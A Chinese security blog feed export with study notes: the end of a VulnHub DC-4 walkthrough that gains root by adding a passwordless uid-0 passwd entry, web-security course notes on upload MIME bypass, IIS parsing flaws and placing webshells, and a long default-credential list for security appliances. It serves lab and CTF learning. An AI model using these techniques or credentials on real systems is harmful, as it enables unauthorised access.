<p><img src="/2022/08/29/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></p>
<p>然后就等待我们输入数据</p>
<p><img src="/2022/08/29/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></p>
<p>按照<code>root</code>用户格式，我们添加自己的数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="symbol">ttoc:</span>(这里是密码，可以加入自己的哈希后的密码，当然不加就可以直接登录，这里我不加，忽略)<span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></p>
<p>添加成功，我们再看看能不能登录，是不是管理员</p>
<p><img src="/2022/08/29/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></p>
<p>发现是管理员，直接到<code>root</code>目录下，查看 <code>flag</code>即可</p>
<p><img src="/2022/08/29/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">意思是</span><br><span class="line">恭喜！！！</span><br><span class="line"></span><br><span class="line">希望你喜欢 DC-4。只是想向所有这些人表示衷心的感谢</span><br><span class="line">谁提供了反馈，谁花时间完成了这些小事</span><br><span class="line">挑战。</span><br><span class="line"></span><br><span class="line">如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</span><br></pre></td></tr></table></figure></div>

<p><strong>一个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="五、DC-5-中级-高级"><a href="#五、DC-5-中级-高级" class="headerlink" title="五、DC-5[中级/高级]"></a>五、DC-5[中级/高级]</h1><p><strong>only one flag</strong></p>
<p>养成习惯，先顺手用<code>nmap</code>扫一下靶机端口运行的服务信息</p>
<p><img src="/2022/08/29/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>小迪web视频学习记录</title>
    <url>/2022/07/21/xiaodi/</url>
    <content><![CDATA[<p><u><code>看看小迪师傅的视频，把一些知识点补充以及深入学习一下，做做笔记</code></u></p>
<span id="more"></span>

<hr>
<p><code>时间不是按小迪师傅视频来的，是看我当天的时间，尽量每天能看个一两个吧</code></p>
<h2 id="DAY1-基础入门-概念名词"><a href="#DAY1-基础入门-概念名词" class="headerlink" title="DAY1 基础入门-概念名词"></a>DAY1 基础入门-概念名词</h2><p><img src="/2022/07/21/xiaodi/image-20220725210618077.png" alt="image-20220725210618077"></p>
<p><strong>1.DNS</strong>：一般指域名系统，可以将IP和域名相互转化，比如访问baidu.com，DNS就会查出它的IP例如120.0.0.1，进行访问，从而人们不用输入复杂的IP</p>
<p>我们有时<u>打开一些网站或者下载东西时卡顿</u>，我们百度往往会得到一个方法修改<strong>hosts</strong>文件</p>
<p><strong>hosts</strong>文件负责解析域名并优先于DNS服务，通常很多恶意软件会恶意更改该文件来达到劫持网站的目地，也就是DNS攻击</p>
<p>比如下图，当在<strong>hosts</strong>文件里加上时，当我们在浏览器访问<code>www.baidu.com</code>的时候就会访问<strong>IP:14.215.177.38</strong>，而这个<strong>IP</strong>可能是百度的网站，也可能是钓鱼网站的IP，这个时候我们光看浏览器网站域名就根本分不清楚（如果钓鱼网站页面和我们的目标网站界面一致）</p>
<p><img src="/2022/07/21/xiaodi/image-20220721145608355.png" alt="image-20220721145608355"></p>
<hr>
<h2 id="DAY2-基础入门-数据包拓展"><a href="#DAY2-基础入门-数据包拓展" class="headerlink" title="DAY2 基础入门-数据包拓展"></a>DAY2 基础入门-数据包拓展</h2><h3 id="1-proxy"><a href="#1-proxy" class="headerlink" title="1.proxy"></a>1.proxy</h3><p>下面这张图很好的解释了<strong>proxy</strong>的作用，它是浏览器和服务器之间的，是两者数据交互的中间桥梁，利用<strong>proxy</strong>就可以实现修改浏览器发送的请求和服务器发回的数据包，或者拦截获取</p>
<p><img src="/2022/07/21/xiaodi/image-20220721144031544.png" alt="image-20220721144031544"></p>
<h3 id="2-http和https"><a href="#2-http和https" class="headerlink" title="2.http和https"></a>2.http和https</h3><p><strong>https</strong>相对<strong>http</strong>更安全的原因在于<strong>SSL or TLS</strong>的存在，它不在像<strong>http</strong>一样把信息以明文的形式呈现出来，比如利用<strong>burp</strong>抓包，http的信息（比如账号密码）就会显现出来，而<strong>SSL or TLS</strong>会对其信息进行加密<strong>（需要私钥才解的开）</strong>，那就算被抓包，也只能得到一串加密数据</p>
<p><u>这里推荐可以买本<strong>《图解http》</strong>看看</u></p>
<p><img src="/2022/07/21/xiaodi/image-20220721144040328.png" alt="image-20220721144040328"></p>
<p> 下面是http简要通讯流程</p>
<p><img src="/2022/07/21/xiaodi/1.png" alt="image-20220721150847367"></p>
<p>下面就是https的响应流程</p>
<p><img src="/2022/07/21/xiaodi/image-20220721150429225.png" alt="image-20220721150429225"></p>
<h3 id="3-Request请求数据包"><a href="#3-Request请求数据包" class="headerlink" title="3.Request请求数据包"></a>3.Request请求数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220723220144117.png" alt="image-20220723220144117"></p>
<h4 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h4><p>如下例，</p>
<p>请求方法：GET   ||  请求url：index.html  ||   HTTP版本：1.1</p>
<p><img src="/2022/07/21/xiaodi/image-20220723220333853.png" alt="image-20220723220333853"></p>
<p><img src="/2022/07/21/xiaodi/image-20220723221340261.png" alt="image-20220723221340261"></p>
<h4 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2.请求头"></a>2.请求头</h4><p><img src="/2022/07/21/xiaodi/image-20220724172547877.png" alt="image-20220724172547877"></p>
<p>1）MIME文件格式可以修改绕过MIME验证，在文件上传的时候，就可以修改MIME类型来绕过前端验证</p>
<p>比如需要图片格式，但设有MIME验证，而上传php或其他文件时，</p>
<p>Accept为application/octet-stream   为了上传成功就需要修改其为image/png，从而绕过MIME验证</p>
<p><img src="/2022/07/21/xiaodi/image-20220724173613276.png" alt="image-20220724173613276"></p>
<p>Referer代表产生请求的网页，如果是在该网站访问该网站的链接，那referer可能为空，如果是从其他网站请求访问，就会在referer处显示网站url</p>
<p>一些网站可能会验证referer判断是否可能是从其他网站来的，保护用户账号安全，避免用户cookie被盗用，也就是csrf漏洞</p>
<p><img src="/2022/07/21/xiaodi/image-20220724175117961.png" alt="image-20220724175117961"></p>
<h4 id="3-空行和请求体"><a href="#3-空行和请求体" class="headerlink" title="3.空行和请求体"></a>3.空行和请求体</h4><p><img src="/2022/07/21/xiaodi/image-20220724211529241.png" alt="image-20220724211529241"></p>
<p>空行和请求体可以看看下面这个例子</p>
<p><img src="/2022/07/21/xiaodi/image-20220724203919573.png" alt="image-20220724203919573"></p>
<p>可以看到请求体是<code>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</code>而其上面就是和请求头分开的空行</p>
<p><img src="/2022/07/21/xiaodi/image-20220724203945852.png" alt="image-20220724203945852"></p>
<h3 id="4-response返回数据包"><a href="#4-response返回数据包" class="headerlink" title="4.response返回数据包"></a>4.response返回数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220724213601900.png" alt="image-20220724213601900"></p>
<p><u><strong>HTTP响应码（状态码）</strong></u></p>
<p><img src="/2022/07/21/xiaodi/image-20220723215355113.png" alt="image-20220723215355113"></p>
<h4 id="1-状态行"><a href="#1-状态行" class="headerlink" title="1.状态行"></a>1.状态行</h4><p>下例<strong>状态代码</strong>：200  || <strong>协议版本</strong>：HTTP/1.1 ||   <strong>状态描述</strong>：OK</p>
<p><img src="/2022/07/21/xiaodi/image-20220724222056594.png" alt="image-20220724222056594"></p>
<h4 id="2-响应头标"><a href="#2-响应头标" class="headerlink" title="2.响应头标"></a>2.响应头标</h4><p>上图除了第一行以外就是响应头标，类似请求头</p>
<h4 id="3-空行"><a href="#3-空行" class="headerlink" title="3.空行"></a>3.空行</h4><p>在响应头标和响应数据之间，表示响应头标的结束</p>
<h4 id="4-响应数据"><a href="#4-响应数据" class="headerlink" title="4.响应数据"></a>4.响应数据</h4><p><strong>响应数据</strong>就是当前页面的源代码</p>
<p><img src="/2022/07/21/xiaodi/image-20220724222442836.png" alt="image-20220724222442836"></p>
<hr>
<h2 id="DAY3-基础入门-搭建安全拓展"><a href="#DAY3-基础入门-搭建安全拓展" class="headerlink" title="DAY3 基础入门-搭建安全拓展"></a>DAY3 基础入门-搭建安全拓展</h2><h3 id="1-常见搭建平台脚本启用"><a href="#1-常见搭建平台脚本启用" class="headerlink" title="1.常见搭建平台脚本启用"></a>1.常见搭建平台脚本启用</h3><p><img src="/2022/07/21/xiaodi/image-20220725230825776.png" alt="image-20220725230825776"></p>
<h3 id="2-域名IP目录解析安全问题"><a href="#2-域名IP目录解析安全问题" class="headerlink" title="2.域名IP目录解析安全问题"></a>2.域名IP目录解析安全问题</h3><p><strong>域名访问</strong>时（如<code>www.baidu.com</code>）一般是<strong>指向某个特定文件</strong>，用工具扫描时，也只能扫描该目录下的文件</p>
<p><strong>IP访问</strong>时就可以<strong>访问到根目录</strong>，扫描时就可能扫描到该站点下的所有文件，甚至还有网站源码备份文件</p>
<p><u>一般是IP和域名同时使用</u></p>
<h3 id="3-常见文件后缀解析对应安全"><a href="#3-常见文件后缀解析对应安全" class="headerlink" title="3.常见文件后缀解析对应安全"></a>3.常见文件后缀解析对应安全</h3><p><img src="/2022/07/21/xiaodi/image-20220725210703706.png" alt="image-20220725210703706"></p>
<p>下图是，iis中间件</p>
<p>扩展名对应配置文件，使得有该扩展名的文件以配置文件定义的方式打开或运行</p>
<p>如，添加一个扩展名为.haha，对应的配置文件就为下图的.asp扩展名对应的配置文件，这样打开.haha扩展名的文件就相当于打开.asp类型的文件了</p>
<p>所以，利用这个有时候我们上传以为正确的文件扩展名，但却无法以我们想要的方式打开或者用蚁剑、菜刀等工具连接，就可能是中间件解析协议修改了本来的扩展名</p>
<p>如删除了.asp，只保留.haha扩展名，如果上传.asp扩展名文件，就会无效，使得我们受阻，只有上传.haha扩展名文件才可以被视为asp文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">这里做个补充，，之前做过一个“内部文件上传系统漏洞分析溯源”的题，提到了iis低版本解析漏洞</span><br><span class="line"></span><br><span class="line">IIS解析漏洞分为两种：</span><br><span class="line">（1）一种是在以“<span class="string">.asp</span>”“<span class="string">.asa</span>”命名的文件夹内，所有文件都以asp文件被解析。</span><br><span class="line">（2）第二种是IIS的文件解析,形式：<span class="string">/xx.asp</span>;<span class="string">.jpg</span>（利⽤特殊符号 <span class="string">&quot;;&quot;</span><span class="string">.xx.asp</span>;<span class="string">.jpg</span> 被解析为asp脚本</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/21/xiaodi/image-20220725223658222.png" alt="image-20220725223658222"></p>
<h3 id="4-常见安全测试中的安全防护"><a href="#4-常见安全测试中的安全防护" class="headerlink" title="4.常见安全测试中的安全防护"></a>4.常见安全测试中的安全防护</h3><h4 id="1-拒绝匿名访问"><a href="#1-拒绝匿名访问" class="headerlink" title="1.拒绝匿名访问"></a>1.拒绝匿名访问</h4><p>这样想要访问网站页面的时候，就需要输入限定账号和密码，否则就无法进行访问</p>
<h4 id="2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"><a href="#2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）" class="headerlink" title="2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"></a>2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）</h4><p>通过添加对方IP，来实现在IP内的所有计算机网络都无法访问该网站</p>
<h3 id="5-WEB后门与用户及文件权限"><a href="#5-WEB后门与用户及文件权限" class="headerlink" title="5.WEB后门与用户及文件权限"></a>5.WEB后门与用户及文件权限</h3><p>利用菜刀等工具，可以连接到服务器中的后门，但是如果服务器端设置了对Internet 来宾用户的权限时，就会遇到阻碍</p>
<p>如设置拒绝读取，那么菜刀就无法读取该文件夹下的内容，就在前面提到网站的拒绝匿名访问</p>
<p>如果设置拒绝写入，那么菜刀就无法在其中新建文件</p>
<p>但是该网站这个目录下的网站页面，也无法正常访问</p>
<p><img src="/2022/07/21/xiaodi/image-20220726110555183.png" alt="image-20220726110555183"></p>
<p>下图为网站不给执行权限，也就是里面的文件都无法执行，这样无论是访问我们上传的木马，还是菜刀试着连接木马，都不行，以因为没有了执行权限，那么我们写的一句话木马的代码也发挥不了作用</p>
<p>这也是实战中为什么会这么困难和复杂</p>
<p><u><strong>那么一般如何解决这个问题呢？</strong></u></p>
<p>我们可以试试换一个目录，一般这种限制最可能在例如upload这种目录，但是img这类图片目录下，常理而言是没有脚本文件，所以很有可能是没有加以限制的，所以在上传文件的时候，可以试试抓包然后修改文件上传的目录，从而使得脚本可以正常执行和与工具连接</p>
<p>一般思路就是把脚本文件努力上传到最可能没有限制的目录下，比如<u>根目录</u>，或者<u>网站自身的脚本目录</u>（因为它自身可能也需要运行它自己的脚本，所以大概率不可能在那个目录下加上权限，这样它自己也无法正常运行了）</p>
<p><img src="/2022/07/21/xiaodi/image-20220726110523557.png" alt="image-20220726110523557"></p>
<h3 id="6-网站源码脚本格式"><a href="#6-网站源码脚本格式" class="headerlink" title="6.网站源码脚本格式"></a>6.网站源码脚本格式</h3><p><code>一般可以根据数据库类型，或者网站搭建的中间件平台加以推导</code></p>
<h4 id="1-知道数据库类型"><a href="#1-知道数据库类型" class="headerlink" title="1.知道数据库类型"></a>1.知道数据库类型</h4><p>mysql数据库一般是php脚本</p>
<p>sqlserver数据库一般是asp或aspx脚本</p>
<p>oracle数据库一般是python脚本</p>
<h4 id="2-知道中间件"><a href="#2-知道中间件" class="headerlink" title="2.知道中间件"></a>2.知道中间件</h4><p>iis一般用asp或aspx</p>
<p>apache一般php脚本居多</p>
<p>tomcat一般jsp脚本</p>
<p>如果判断不出网站的源码脚本文件，</p>
<p>可能网站做了伪静态，那么在脚本类型不会在网站地址下去体现，但是用<u><strong>扫描工具</strong></u>可以更加深入的爬寻文件</p>
<p>还有一个方法就是在<u><strong>谷歌搜索引擎</strong></u>上看看有没有该网站的快照信息，有快照信息就可以针对性的用关键词筛选一下，看有没有脚本运行信息出现</p>
<p>还有就是可以<u><strong>抓网站的数据包</strong></u>，看看数据包里，一般的如果数据包的写法不同，里面的cookie值就会有所不同，比如phpsession,jspsession，就可以根据前缀知道是什么类型的脚本文件 ，如果都不是可能就是asp或aspx</p>
<hr>
<h2 id="DAY4-基础入门-WEB源码拓展"><a href="#DAY4-基础入门-WEB源码拓展" class="headerlink" title="DAY4 基础入门-WEB源码拓展"></a>DAY4 基础入门-WEB源码拓展</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p>
<p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p>
<h3 id="1-网站源码文件目录"><a href="#1-网站源码文件目录" class="headerlink" title="1.网站源码文件目录"></a>1.网站源码文件目录</h3><p>admin：后台文件目录</p>
<p>data：数据相关，可能有数据库配置文件【可能直接连接到对方的数据库获得对方的数据库信息】</p>
<p>include：数据库目录</p>
<p>template；网站模板文件,和网站界面相关，优化网站架构【(艹皿艹 )想起学ssti漏洞，看了好几天文章】</p>
<h3 id="2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"><a href="#2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题" class="headerlink" title="2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"></a>2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题</h3><p>可以在这个网站上看看脚本语言类型<code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
<p>当看到网站的脚本格式时，就大致可以猜测到大概容易出现什么漏洞，</p>
<p>因为网站源码语言和应用不同，编写的方式也不同，出现的问题也就不同，从而针对性的寻找或修复漏洞，节约时间，提高效率</p>
<h3 id="3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"><a href="#3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞" class="headerlink" title="3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"></a>3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞</h3><h3 id="4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"><a href="#4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等" class="headerlink" title="4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"></a>4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</h3><p>CMS：内容管理系统（content management system，CMS），是一种位于WEB前端（Web  服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>以及<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>网站的信息。</p>
<h3 id="5-关于源码获取相关途径"><a href="#5-关于源码获取相关途径" class="headerlink" title="5.关于源码获取相关途径"></a>5.关于源码获取相关途径</h3><p>搜索，咸鱼淘宝，第三方源码站，各种行业对应，一些源码可能就可以找到源码，但一般是大众型的，而一些小型（或者灰色的网站）网站可能搜不到的，咸鱼等一些第三方源码可能找到的</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h3><p>关注应用分类及脚本类型估摸出可能存在的漏洞(其中框架类例外)，在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理(数据库备份，bak文件等)，未获取到的源码采用各种方法想办法获取!</p>
<hr>
<h3 id="asp网站"><a href="#asp网站" class="headerlink" title="asp网站"></a>asp网站</h3><p>有一个mdb文件【表格文件】，存放数据，相当于数据库，后台的账号密码一般在上面</p>
<p>如果网站是直接套用的网站源码结构，没有进行修改，其中就包括数据库路径，那么我们就可以尝试把数据库的路径防止物联网网上尝试下载【一般是进行过滤了，几乎不可能下载成功】，</p>
<p>比如知道<code>www.hahaha.com</code>这个网站的数据库在<code>/admin/schema/</code>这个路径里，数据库文件名为<code>flag.mdb</code></p>
<p>那我们访问<code>www.hahaha.com/admin/schema/flag.mdb</code>就可能下载下来数据库文件，查看里面的后台的账号和密码【密码一般加密了的(md5)】</p>
<h3 id="php网站"><a href="#php网站" class="headerlink" title="php网站"></a>php网站</h3>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>个人生活琐事</title>
    <url>/2022/09/24/life/</url>
    <content><![CDATA[<p><code>随便写写</code></p>
<span id="more"></span>]]></content>
      <categories>
        <category>生活</category>
      </categories>
  </entry>
  <entry>
    <title>HACK THE BOX</title>
    <url>/2022/09/23/Hackthebox/</url>
    <content><![CDATA[<p><strong>想准备试试OSCP，<code>HACK THE BOX</code>还行，我就把免费的做一下，学习一下工具的一下使用，以及一些题目和概念了解</strong></p>
<span id="more"></span>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>CTFHub-wp</title>
    <url>/2022/07/27/CTFHub-wp/</url>
    <content><![CDATA[<p><u><code>做做笔记</code></u></p>
<span id="more"></span>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-密码口令"><a href="#1-密码口令" class="headerlink" title="1.密码口令"></a>1.密码口令</h2><h3 id="1）弱口令"><a href="#1）弱口令" class="headerlink" title="1）弱口令"></a>1）弱口令</h3><p>一般思维，</p>
<p>用户名：admin，root</p>
<p>密码：password，admin123，123456</p>
<p>可以用<strong>top100字典</strong>（可以网上找一下）跑一下，但有的可能需要<strong>枚举法</strong></p>
<p>比如<strong>admin888</strong>或者<strong>admin255</strong>这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况</p>
<h3 id="2）默认口令"><a href="#2）默认口令" class="headerlink" title="2）默认口令"></a>2）默认口令</h3><p>就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">常见网络安全设备弱口令(默认口令)</span><br><span class="line">设备    默认账号    默认密码</span><br><span class="line">深信服产品    sangfor    sangfor sangfor@<span class="number">2018</span> sangfor@<span class="number">2019</span></span><br><span class="line">深信服科技 AD        dlanrecover</span><br><span class="line">深信服负载均衡 AD <span class="number">3.6</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服WAC ( WNS V2<span class="number">.6</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服VPN    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">深信服ipsec-VPN (SSL <span class="number">5.5</span>)    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">深信服AC6<span class="number">.0</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">SANGFOR防火墙    <span class="keyword">admin</span>    sangfor</span><br><span class="line">深信服AF(NGAF V2<span class="number">.2</span>)    <span class="keyword">admin</span>    sangfor</span><br><span class="line">深信服NGAF下一代应用防火墙(NGAF V4<span class="number">.3</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服AD3<span class="number">.9</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">深信服上网行为管理设备数据中心    <span class="keyword">Admin</span>    密码为空</span><br><span class="line">SANGFOR_AD_v5<span class="number">.1</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">网御漏洞扫描系统    leadsec    leadsec</span><br><span class="line">天阗入侵检测与管理系统 V7<span class="number">.0</span>    <span class="keyword">Admin</span>    venus70</span><br><span class="line">Audit    venus70</span><br><span class="line">adm    venus70</span><br><span class="line">天阗入侵检测与管理系统 V6<span class="number">.0</span>    <span class="keyword">Admin</span>    venus60</span><br><span class="line">Audit    venus60</span><br><span class="line">adm    venus60</span><br><span class="line">网御WAF集中控制中心(V3<span class="number">.0</span>R5<span class="number">.0</span>)    <span class="keyword">admin</span>    leadsec.waf</span><br><span class="line">audit    leadsec.waf</span><br><span class="line">adm    leadsec.waf</span><br><span class="line">联想网御    administrator    administrator</span><br><span class="line">网御事件服务器    <span class="keyword">admin</span>    admin123</span><br><span class="line">联想网御防火墙PowerV    administrator    administrator</span><br><span class="line">联想网御入侵检测系统    lenovo    <span class="keyword">default</span></span><br><span class="line">网络卫士入侵检测系统    <span class="keyword">admin</span>    talent</span><br><span class="line">网御入侵检测系统V3<span class="number">.2</span><span class="number">.72</span><span class="number">.0</span>    adm    leadsec32</span><br><span class="line"><span class="keyword">admin</span>    leadsec32</span><br><span class="line">联想网御入侵检测系统IDS    root    <span class="number">111111</span></span><br><span class="line"><span class="keyword">admin</span>    admin123</span><br><span class="line">科来网络回溯分析系统    csadmin    colasoft</span><br><span class="line">中控考勤机web3<span class="number">.0</span>    administrator    <span class="number">123456</span></span><br><span class="line">H3C iMC    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C SecPath系列    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C S5120-SI    test    <span class="number">123</span></span><br><span class="line">H3C智能管理中心    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C ER3100    <span class="keyword">admin</span>    adminer3100</span><br><span class="line">H3C ER3200    <span class="keyword">admin</span>    adminer3200</span><br><span class="line">H3C ER3260    <span class="keyword">admin</span>    adminer3260</span><br><span class="line">H3C    <span class="keyword">admin</span>    adminer</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    h3capadmin</span><br><span class="line">h3c    h3c</span><br><span class="line"><span class="number">360</span>天擎    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">网神防火墙    firewall    firewall</span><br><span class="line">天融信防火墙NGFW4000    superman    talent</span><br><span class="line">黑盾防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">rule</span>    abc123</span><br><span class="line">audit    abc123</span><br><span class="line">华为防火墙    telnetuser    telnetpwd</span><br><span class="line">ftpuser    ftppwd</span><br><span class="line">方正防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">飞塔防火墙    <span class="keyword">admin</span>    密码为空</span><br><span class="line">Juniper_SSG__5防火墙    netscreen    netscreen</span><br><span class="line">中新金盾硬件防火墙    <span class="keyword">admin</span>    <span class="number">123</span></span><br><span class="line">kill防火墙(冠群金辰)    <span class="keyword">admin</span>    sys123</span><br><span class="line">天清汉马USG防火墙    <span class="keyword">admin</span>    venus.fw</span><br><span class="line">Audit    venus.audit</span><br><span class="line">useradmin    venus.<span class="keyword">user</span></span><br><span class="line">阿姆瑞特防火墙    <span class="keyword">admin</span>    manager</span><br><span class="line">山石网科    hillstone    hillstone</span><br><span class="line">绿盟安全审计系统    weboper    weboper</span><br><span class="line">webaudit    webaudit</span><br><span class="line">conadmin    conadmin</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">shell    shell</span><br><span class="line">绿盟产品        nsfocus123</span><br><span class="line">TopAudit日志审计系统    superman    talent</span><br><span class="line">LogBase日志管理综合审计系统    <span class="keyword">admin</span>    safetybase</span><br><span class="line">网神SecFox运维安全管理与审计系统    <span class="keyword">admin</span>    !<span class="number">1</span>fw@<span class="number">2</span>soc#<span class="number">3</span>vpn</span><br><span class="line">天融信数据库审计系统    superman    telent</span><br><span class="line">Hillstone安全审计平台    hillstone    hillstone</span><br><span class="line">网康日志中心    ns25000    ns25000</span><br><span class="line">网络安全审计系统（中科新业）    <span class="keyword">admin</span>    <span class="number">123456</span></span><br><span class="line">天玥网络安全审计系统    <span class="keyword">Admin</span>    cyberaudit</span><br><span class="line">明御WEB应用防火墙    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    adminadmin</span><br><span class="line">明御攻防实验室平台    root    <span class="number">123456</span></span><br><span class="line">明御安全网关    <span class="keyword">admin</span>    adminadmin</span><br><span class="line">明御运维审计与册风险控制系统    <span class="keyword">admin</span>    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">system</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">auditor    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">operator</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">明御网站卫士    sysmanager    sysmanager888</span><br><span class="line">亿邮邮件网关    eyouuser    eyou_admin</span><br><span class="line">eyougw    <span class="keyword">admin</span>@(eyou)</span><br><span class="line"><span class="keyword">admin</span>    +-ccccc</span><br><span class="line"><span class="keyword">admin</span>    cyouadmin</span><br><span class="line">Websense邮件安全网关    administrator    <span class="keyword">admin</span></span><br><span class="line">梭子鱼邮件存储网关    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br></pre></td></tr></table></figure></div>

